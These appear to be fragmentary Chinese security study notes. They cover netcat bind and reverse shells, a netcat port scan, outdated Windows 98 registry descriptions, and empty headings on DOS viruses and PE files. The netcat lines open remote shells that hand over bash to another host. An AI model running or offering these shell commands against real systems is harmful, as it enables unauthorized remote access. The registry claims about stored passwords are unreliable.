### nc的远程控制

1.正向连接（A将自己的Bash发给B）

```
A:nc -lp port -c bash`
`B:nc ip port		
```

2.反向连接（b将自己的bash发给a）

```
A:nc -lp port`
`B:nc ip port -c bash
```

3.nc端口扫描

```nc -nvz ip 1-65535```



### 注册表

 1.HKEY_USERS 
  该根键保存了存放在本地计算机口令列表中的用户标识和密码列表。每个用户的预配置信息都存储在HKEY_USERS根键中。HKEY_USERS是远程计算机中访问的根键之一。 
  2.HKEY_CURRENT_USER 
  该根键包含本地工作站中存放的当前登录的用户信息,包括用户登录用户名和暂存的密码(注：此密码在输入时是隐藏的)。用户登录Windows 98时，其信息从HKEY_USERS中相应的项拷贝到HKEY_CURRENT_USER中。 
  3.HKEY_CURRENT_CONFIG 
  该根键存放着定义当前用户桌面配置(如显示器等)的数据,最后使用的文档列表（MRU）和其他有关当前用户的Windows 98中文版的安装的信息。图5为HKEY_CURRENT_CONFIG子关键字之间的连接情况。 
  4.HKEY_CLASSES_ROOT 
  根据在Windows 98中文版中安装的应用程序的扩展名,该根键指明其文件类型的名称。 
  在第一次安装Windows 98中文版时,RTF(Rich Text format)文件与写字板(WordPad)&127;联系起来,但在以后安装了中文Word 6.0后，双击一个RTF文件时，将自动激活Word。存放在SYSTEM.DAT中的HKEY_CLASSES_ROOT，将替代WIN.INI文件中的[Extensions]&127;小节中的设置项,它把应用程序与文件扩展名联系起来,它也替代了Windows 3.x中的Reg.dat文件中的相似的设置项。 
  5.HKEY_LOCAL_MACHINE 
  该根键存放本地计算机硬件数据,此根键下的子关键字包括在SYSTEM.DAT中,用来提供HKEY_LOCAL_MACHINE所需的信息,或者在远程计算机中可访问的一组键中。 
  该根键中的许多子键与System.ini文件中设置项类似。图7显示了HKEY_LOCAL_MACHINE根键下的各个子键之间的情况。 
  6.HKEY_DYN_DATA 
  该根键存放了系统在运行时动态数据，此数据在每次显示时都是变化的，因此，此根键下的信息没有放在注册表中。图8显示了HKEY_DYN_DATA根键下的各个子键的情况。 




### dos病毒

**重点**



***文件格式***

***搜索文件***



### PE文件

 